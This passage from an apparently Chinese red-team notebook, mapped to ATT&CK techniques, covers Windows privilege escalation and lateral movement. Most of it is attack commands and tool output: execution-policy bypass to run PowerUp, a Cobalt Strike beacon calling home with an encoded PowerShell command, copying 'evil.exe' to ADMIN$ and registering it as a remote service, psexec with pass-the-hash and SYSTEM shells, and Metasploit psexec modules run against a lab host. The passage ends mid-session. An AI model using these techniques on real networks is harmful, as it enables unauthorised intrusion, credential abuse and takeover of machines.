状态:   已禁用

特权名: SeChangeNotifyPrivilege
描述:   跳过遍历检查
状态:   已启用

特权名: SeSecurityPrivilege
描述:   管理审核和安全日志
状态:   已禁用

特权名: SeBackupPrivilege
描述:   备份文件和目录
状态:   已禁用

特权名: SeRestorePrivilege
描述:   还原文件和目录
状态:   已禁用

特权名: SeSystemtimePrivilege
描述:   更改系统时间
状态:   已禁用

特权名: SeShutdownPrivilege
描述:   关闭系统
状态:   已禁用

特权名: SeRemoteShutdownPrivilege
描述:   从远程系统强制关机
状态:   已禁用

特权名: SeTakeOwnershipPrivilege
描述:   取得文件或其他对象的所有权
状态:   已禁用

特权名: SeDebugPrivilege
描述:   调试程序
状态:   已禁用

特权名: SeSystemEnvironmentPrivilege
描述:   修改固件环境值
状态:   已禁用

特权名: SeSystemProfilePrivilege
描述:   配置系统性能
状态:   已禁用

特权名: SeProfileSingleProcessPrivilege
描述:   配置单一进程
状态:   已禁用

特权名: SeIncreaseBasePriorityPrivilege
描述:   增加计划优先级
状态:   已禁用

特权名: SeLoadDriverPrivilege
描述:   装载和卸载设备驱动程序
状态:   已禁用

特权名: SeCreatePagefilePrivilege
描述:   创建页面文件
状态:   已禁用

特权名: SeIncreaseQuotaPrivilege
描述:   调整进程的内存配额
状态:   已禁用

特权名: SeUndockPrivilege
描述:   从扩展坞中取出计算机
状态:   已禁用

特权名: SeManageVolumePrivilege
描述:   执行卷维护任务
状态:   已禁用

特权名: SeImpersonatePrivilege
描述:   身份验证后模拟客户端
状态:   已启用

特权名: SeCreateGlobalPrivilege
描述:   创建全局对象
状态:   已启用

</pre></div>
<h2><a id="user-content-path-interception路径劫持" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#path-interception%E8%B7%AF%E5%BE%84%E5%8A%AB%E6%8C%81"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Path Interception(路径劫持)</h2>
<p>原理：</p>
<pre><code>在服务路径权限不对或者配置错误时会被攻击者进行提权操作

Service paths (stored in Windows Registry keys) [2] and shortcut paths are vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., C:\unsafe path with space\program.exe vs. "C:\safe path with space\program.exe"). [3] An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is C:\program files\myapp.exe, an adversary may create a program at C:\program.exe that will be run instead of the intended program. [4] [5]

服务路径(存储在Windows注册表项中)[2]和快捷方式很容易被路径拦截，如果路径有一个或多个空格，并且没有被引号包围(例如，C:\ \program.exe vs. C:\ safe path with space\program.exe)。"C:\安全路径与空格\program.exe")。对手可以将可执行文件放在路径的较高级别目录中，Windows将解析该可执行文件而不是预期的可执行文件。例如，如果快捷方式中的路径是C:\program files\myapp。竞争对手可以在C:\program.exe上创建一个程序，该程序将代替预期的程序运行

PATH Environment Variable Misconfiguration
The PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory, %SystemRoot%\system32 (e.g., C:\Windows\system32), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.

For example, if C:\example path precedes C:\Windows\system32 is in the PATH environment variable, a program that is named net.exe and placed in C:\example path will be called instead of the Windows system "net" when "net" is executed from the command-line.

</code></pre>
<h3><a id="user-content-check-for-common-privilege-escalation-methods" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#check-for-common-privilege-escalation-methods"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Check for common privilege escalation methods</h3>
<h4><a id="user-content-terminal下操作借助powershell" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#terminal%E4%B8%8B%E6%93%8D%E4%BD%9C%E5%80%9F%E5%8A%A9powershell"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>terminal下操作（借助powershell）</h4>
<blockquote>
<p>powershell -ep bypass .\powerup.ps1 Invoke-AllChecks</p>
<p>powershell -ExecutionPolicy Bypass  .\powerup.ps1 Invoke-AllChecks</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>PS C:<span class="pl-cce">\U</span>sers<span class="pl-cce">\A</span>dministrator<span class="pl-cce">\D</span>esktop<span class="pl-cce">\p</span>owrshell<span class="pl-k">&gt;</span> powershell -ep bypass .<span class="pl-cce">\p</span>owerup.ps1 Invoke-AllChecks
PS C:<span class="pl-cce">\U</span>sers<span class="pl-cce">\A</span>dministrator<span class="pl-cce">\D</span>esktop<span class="pl-cce">\p</span>owrshell<span class="pl-k">&gt;</span> powershell -ExecutionPolicy Bypass  .<span class="pl-cce">\p</span>owerup.ps1 Invoke-AllChecks
PS C:<span class="pl-cce">\U</span>sers<span class="pl-cce">\A</span>dministrator<span class="pl-cce">\D</span>esktop<span class="pl-cce">\p</span>owrshell<span class="pl-k">&gt;</span> powershell -ExecutionPolicy Bypass -File .<span class="pl-cce">\p</span>owerup.ps1
</pre></div>
<h4><a id="user-content-msf下操作-8" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#msf%E4%B8%8B%E6%93%8D%E4%BD%9C-8"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>msf下操作：</h4>
<blockquote>
<p>exploit/windows/local/trusted_service_path</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>msf5 exploit(windows/local/trusted_service_path) <span class="pl-k">&gt;</span> exploit 

[<span class="pl-k">*</span>] Started reverse TCP handler on 192.168.2.107:4444 
[<span class="pl-k">*</span>] Finding a vulnerable service...
[-] Exploit aborted due to failure: not-vulnerable: No service found with trusted path issues
[<span class="pl-k">*</span>] Exploit completed, but no session was created.
</pre></div>
<h4><a id="user-content-cs下操作-12" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#cs%E4%B8%8B%E6%93%8D%E4%BD%9C-12"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>cs下操作：</h4>
<blockquote>
<p>powershell-import /path/to/PowerUp.ps1</p>
<p>powershell Invoke-AllChecks</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>beacon<span class="pl-k">&gt;</span> powershell C:<span class="pl-cce">\U</span>sers<span class="pl-cce">\A</span>dministrator<span class="pl-cce">\D</span>esktop<span class="pl-cce">\p</span>owrshell<span class="pl-cce">\p</span>owerup.ps1
[<span class="pl-k">*</span>] Tasked beacon to run: C:<span class="pl-cce">\U</span>sers<span class="pl-cce">\A</span>dministrator<span class="pl-cce">\D</span>esktop<span class="pl-cce">\p</span>owrshell<span class="pl-cce">\p</span>owerup.ps1
[+] host called home, sent: 203 bytes
[-] could not spawn powershell -nop -exec bypass -EncodedCommand QwA6AFwAVQBzAGUAcgBzAFwAQQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBcAEQAZQBzAGsAdABvAHAAXABwAG8AdwByAHMAaABlAGwAbABcAHAAbwB3AGUAcgB1AHAALgBwAHMAMQA=: 2
beacon<span class="pl-k">&gt;</span> powershell Invoke-AllChecks
[<span class="pl-k">*</span>] Tasked beacon to run: Invoke-AllChecks
</pre></div>
<h2><a id="user-content-service-execution服务执行" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#service-execution%E6%9C%8D%E5%8A%A1%E6%89%A7%E8%A1%8C"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Service Execution(服务执行)</h2>
<h3><a id="user-content-create-a-new-service-remotely远程创建一个新服务" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#create-a-new-service-remotely%E8%BF%9C%E7%A8%8B%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%96%B0%E6%9C%8D%E5%8A%A1"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Create a new service remotely（远程创建一个新服务）</h3>
<h4><a id="user-content-terminal下操作-9" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#terminal%E4%B8%8B%E6%93%8D%E4%BD%9C-9"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>terminal下操作</h4>
<blockquote>
<p>net use \COMP\ADMIN$ "password" /user:DOMAIN_NAME\UserName</p>
<p>copy evil.exe \COMP\ADMIN$\acachsrv.exe</p>
<p>sc \COMP create acachsrv binPath= "C:\Windows\System32\acachsrv.exe" start= auto description= "Description here" DisplayName= "DisplayName"</p>
<p>sc \COMP start acachsrv</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>C:<span class="pl-cce">\D</span>ocuments and Settings<span class="pl-cce">\A</span>dministrator<span class="pl-k">&gt;</span>net use <span class="pl-cce">\\</span>COMP<span class="pl-cce">\A</span>DMIN$ <span class="pl-s"><span class="pl-pds">"</span>password<span class="pl-pds">"</span></span> /user:D
OMAIN_NAME<span class="pl-cce">\U</span>serName
发生系统错误 67。

找不到网络名。


C:<span class="pl-cce">\D</span>ocuments and Settings<span class="pl-cce">\A</span>dministrator<span class="pl-k">&gt;</span>copy evil.exe <span class="pl-cce">\\</span>COMP<span class="pl-cce">\A</span>DMIN$<span class="pl-cce">\S</span>ystem32<span class="pl-cce">\a</span>ca
chsrv.exe
系统找不到指定的文件。

C:<span class="pl-cce">\D</span>ocuments and Settings<span class="pl-cce">\A</span>dministrator<span class="pl-k">&gt;</span>sc <span class="pl-cce">\\</span>COMP create acachsrv binPath= <span class="pl-s"><span class="pl-pds">"</span>C:\W</span>
<span class="pl-s">indows\System32\acachsrv.exe<span class="pl-pds">"</span></span> start= auto  DisplayName= <span class="pl-s"><span class="pl-pds">"</span>DisplayName<span class="pl-pds">"</span></span>
[SC] OpenSCManager 失败 1722:

RPC 服务器不可用。


C:<span class="pl-cce">\D</span>ocuments and Settings<span class="pl-cce">\A</span>dministrator<span class="pl-k">&gt;</span>sc <span class="pl-cce">\\</span>COMP start acachsrv
[SC] OpenSCManager 失败 1722:

RPC 服务器不可用。

</pre></div>
<h4><a id="user-content-cs下操作-13" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#cs%E4%B8%8B%E6%93%8D%E4%BD%9C-13"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>cs下操作：</h4>
<blockquote>
<p>shell net use \COMP\ADMIN$ "password" /user:DOMAIN_NAME\UserName</p>
<p>shell copy evil.exe \COMP\ADMIN$\acachsrv.exe</p>
<p>shell sc \COMP create acachsrv binPath= "C:\Windows\System32\acachsrv.exe" start= auto description= "Description here" DisplayName= "DisplayName"</p>
<p>shell sc \COMP start acachsrv</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>C:<span class="pl-cce">\D</span>ocuments and Settings<span class="pl-cce">\A</span>dministrator<span class="pl-k">&gt;</span>net use <span class="pl-cce">\\</span>COMP<span class="pl-cce">\A</span>DMIN$ <span class="pl-s"><span class="pl-pds">"</span>password<span class="pl-pds">"</span></span> /user:D
OMAIN_NAME<span class="pl-cce">\U</span>serName
发生系统错误 67。

找不到网络名。


C:<span class="pl-cce">\D</span>ocuments and Settings<span class="pl-cce">\A</span>dministrator<span class="pl-k">&gt;</span>copy evil.exe <span class="pl-cce">\\</span>COMP<span class="pl-cce">\A</span>DMIN$<span class="pl-cce">\S</span>ystem32<span class="pl-cce">\a</span>ca
chsrv.exe
系统找不到指定的文件。

C:<span class="pl-cce">\D</span>ocuments and Settings<span class="pl-cce">\A</span>dministrator<span class="pl-k">&gt;</span>sc <span class="pl-cce">\\</span>COMP create acachsrv binPath= <span class="pl-s"><span class="pl-pds">"</span>C:\W</span>
<span class="pl-s">indows\System32\acachsrv.exe<span class="pl-pds">"</span></span> start= auto  DisplayName= <span class="pl-s"><span class="pl-pds">"</span>DisplayName<span class="pl-pds">"</span></span>
[SC] OpenSCManager 失败 1722:

RPC 服务器不可用。


C:<span class="pl-cce">\D</span>ocuments and Settings<span class="pl-cce">\A</span>dministrator<span class="pl-k">&gt;</span>sc <span class="pl-cce">\\</span>COMP start acachsrv
[SC] OpenSCManager 失败 1722:

RPC 服务器不可用。

</pre></div>
<h3><a id="user-content-create-a-new-service-remotely-using-psexec使用psexec创建新的远程服务" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#create-a-new-service-remotely-using-psexec%E4%BD%BF%E7%94%A8psexec%E5%88%9B%E5%BB%BA%E6%96%B0%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Create a new service remotely (using psexec)(使用psexec创建新的远程服务)</h3>
<p>原理：</p>
<div class="highlight highlight-source-shell"><pre>psexec copies over a file to the remote box via SMB, <span class="pl-k">then</span> creates a service (usually a randomly named one) which points to the binary that was just copied over, starts the service, <span class="pl-k">then</span> deletes the service.

使用psexec通过smb复制文件，然后创建一个指向刚刚复制过来的二进制文件的随机名的服务，然后启动、删除服务
</pre></div>
<h4><a id="user-content-terminal下操作-10" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#terminal%E4%B8%8B%E6%93%8D%E4%BD%9C-10"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>terminal下操作：</h4>
<blockquote>
<p>psexec /accepteula \ip -u domain\user -p password -c -f \smbip\share\file.exe (Copy and execute file.exe on the remote system)</p>
<p>psexec /accepteula \ip -u domain\user -p  lm:ntlm cmd.exe /c dir c:\Progra~1 (Run cmd.exe on the remote system using the lm:ntlm password hash - aka pass the hash)</p>
<p>psexec /accepteula \ip -s cmd.exe (Run cmd.exe on the remote box as the SYSTEM user account)</p>
</blockquote>
<h4><a id="user-content-msf下操作-9" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#msf%E4%B8%8B%E6%93%8D%E4%BD%9C-9"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>msf下操作：</h4>
<blockquote>
<p>exploit/windows/smb/psexec</p>
<p>exploit/windows/local/current_user_psexec</p>
<p>auxiliary/admin/smb/psexec_command</p>
<p>auxiliary/scanner/smb/psexec_loggedin_users</p>
<p>exploit/windows/smb/psexec_psh</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>msf5 exploit(multi/handler) <span class="pl-k">&gt;</span> use exploit/windows/smb/psexec
msf5 exploit(windows/smb/psexec) <span class="pl-k">&gt;</span> show options 

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                                 yes       The target address range or CIDR identifier
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target <span class="pl-k">for</span> pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SHARE                 ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             <span class="pl-c1">.</span>                no        The Windows domain to use <span class="pl-k">for</span> authentication
   SMBPass                                no        The password <span class="pl-k">for</span> the specified username
   SMBUser                                no        The username to authenticate as


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(windows/smb/psexec) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> rhosts 192.168.2.103
rhosts =<span class="pl-k">&gt;</span> 192.168.2.103
msf5 exploit(windows/smb/psexec) <span class="pl-k">&gt;</span> exploit 

[-] Handler failed to <span class="pl-c1">bind</span> to 192.168.2.103:4444:-  -
[-] Handler failed to <span class="pl-c1">bind</span> to 0.0.0.0:4444:-  -
[-] 192.168.2.103:445 - Exploit failed [bad-config]: Rex::BindFailed The address is already <span class="pl-k">in</span> use or unavailable: (0.0.0.0:4444).
[<span class="pl-k">*</span>] Exploit completed, but no session was created.

msf5 exploit(windows/smb/psexec) <span class="pl-k">&gt;</span> use exploit/windows/local/current_user_psexec 
msf5 exploit(windows/local/current_user_psexec) <span class="pl-k">&gt;</span> show options 

Module options (exploit/windows/local/current_user_psexec):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   DISPNAME                           no        Service display name (Default: random)
   INTERNAL_ADDRESS                   no        Session<span class="pl-s"><span class="pl-pds">'</span>s internal address or hostname for the victims to grab the payload from (Default: detected)</span>
<span class="pl-s">   KERBEROS          false            yes       Authenticate via Kerberos, dont resolve hostnames</span>
<span class="pl-s">   NAME                               no        Service name on each target in RHOSTS (Default: random)</span>
<span class="pl-s">   RHOSTS                             no        Target address range or CIDR identifier</span>
<span class="pl-s">   SESSION                            yes       The session to run this module on.</span>
<span class="pl-s">   TECHNIQUE         PSH              yes       Technique to use (Accepted: PSH, SMB)</span>
<span class="pl-s"></span>
<span class="pl-s"></span>
<span class="pl-s">Exploit target:</span>
<span class="pl-s"></span>
<span class="pl-s">   Id  Name</span>
<span class="pl-s">   --  ----</span>
<span class="pl-s">   0   Universal</span>
<span class="pl-s"></span>
<span class="pl-s"></span>
<span class="pl-s">msf5 exploit(windows/local/current_user_psexec) &gt; set session 1</span>
<span class="pl-s">session =&gt; 1</span>
<span class="pl-s">msf5 exploit(windows/local/current_user_psexec) &gt; exploit </span>
<span class="pl-s"></span>
<span class="pl-s">msf5 exploit(windows/local/current_user_psexec) &gt; use auxiliary/admin/smb/psexec_command </span>
<span class="pl-s">msf5 auxiliary(admin/smb/psexec_command) &gt; show options </span>
<span class="pl-s"></span>
<span class="pl-s">Module options (auxiliary/admin/smb/psexec_command):</span>
<span class="pl-s"></span>
<span class="pl-s">   Name                  Current Setting                    Required  Description</span>
<span class="pl-s">   ----                  ---------------                    --------  -----------</span>
<span class="pl-s">   COMMAND               net group "Domain Admins" /domain  yes       The command you want to execute on the remote host</span>
<span class="pl-s">   RHOSTS                                                   yes       The target address range or CIDR identifier</span>
<span class="pl-s">   RPORT                 445                                yes       The Target port</span>
<span class="pl-s">   SERVICE_DESCRIPTION                                      no        Service description to to be used on target for pretty listing</span>
<span class="pl-s">   SERVICE_DISPLAY_NAME                                     no        The service display name</span>
<span class="pl-s">   SERVICE_NAME                                             no        The service name</span>
<span class="pl-s">   SMBDomain             .                                  no        The Windows domain to use for authentication</span>
<span class="pl-s">   SMBPass                                                  no        The password for the specified username</span>
<span class="pl-s">   SMBSHARE              C$                                 yes       The name of a writeable share on the server</span>
<span class="pl-s">   SMBUser                                                  no        The username to authenticate as</span>
<span class="pl-s">   THREADS               1                                  yes       The number of concurrent threads</span>
<span class="pl-s">   WINPATH               WINDOWS                            yes       The name of the remote Windows directory</span>
<span class="pl-s"></span>
<span class="pl-s">msf5 auxiliary(admin/smb/psexec_command) &gt; set rhosts 192.168.2.103</span>
<span class="pl-s">rhosts =&gt; 192.168.2.103</span>
<span class="pl-s">msf5 auxiliary(admin/smb/psexec_command) &gt; exploit </span>
<span class="pl-s"></span>
<span class="pl-s">[*] 192.168.2.103:445     - Scanned 1 of 1 hosts (100% complete)</span>
<span class="pl-s">[*] Auxiliary module execution completed</span>
<span class="pl-s"></span>
<span class="pl-s">msf5 auxiliary(admin/smb/psexec_command) &gt; use auxiliary/scanner/smb/psexec_loggedin_users </span>
<span class="pl-s">msf5 auxiliary(scanner/smb/psexec_loggedin_users) &gt; show options </span>
<span class="pl-s"></span>
<span class="pl-s">Module options (auxiliary/scanner/smb/psexec_loggedin_users):</span>
<span class="pl-s"></span>
<span class="pl-s">   Name                  Current Setting  Required  Description</span>
<span class="pl-s">   ----                  ---------------  --------  -----------</span>
<span class="pl-s">   RHOSTS                                 yes       The target address range or CIDR identifier</span>
<span class="pl-s">   RPORT                 445              yes       The Target port</span>
<span class="pl-s">   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing</span>
<span class="pl-s">   SERVICE_DISPLAY_NAME                   no        The service display name</span>
<span class="pl-s">   SERVICE_NAME                           no        The service name</span>
<span class="pl-s">   SMBDomain             .                no        The Windows domain to use for authentication</span>
<span class="pl-s">   SMBPass                                no        The password for the specified username</span>
<span class="pl-s">   SMBSHARE              C$               yes       The name of a writeable share on the server</span>
<span class="pl-s">   SMBUser                                no        The username to authenticate as</span>
<span class="pl-s">   THREADS               1                yes       The number of concurrent threads</span>
<span class="pl-s">   USERNAME                               no        The name of a specific user to search for</span>
<span class="pl-s">   WINPATH               WINDOWS          yes       The name of the Windows directory</span>
<span class="pl-s"></span>
<span class="pl-s">msf5 auxiliary(scanner/smb/psexec_loggedin_users) &gt; set rhosts 192.168.2.103</span>
<span class="pl-s">rhosts =&gt; 192.168.2.103</span>
<span class="pl-s">msf5 auxiliary(scanner/smb/psexec_loggedin_users) &gt; exploit </span>
<span class="pl-s"></span>
<span class="pl-s">[-] 192.168.2.103:445     - The connection was refused by the remote host (192.168.2.103:445).</span>
<span class="pl-s">[*] 192.168.2.103:445     - Scanned 1 of 1 hosts (100% complete)</span>
<span class="pl-s">[*] Auxiliary module execution completed</span>
<span class="pl-s"></span>
<span class="pl-s">msf5 auxiliary(scanner/smb/psexec_loggedin_users) &gt; use exploit/windows/smb/psexec_psh </span>
<span class="pl-s">msf5 exploit(windows/smb/psexec_psh) &gt; show options </span>
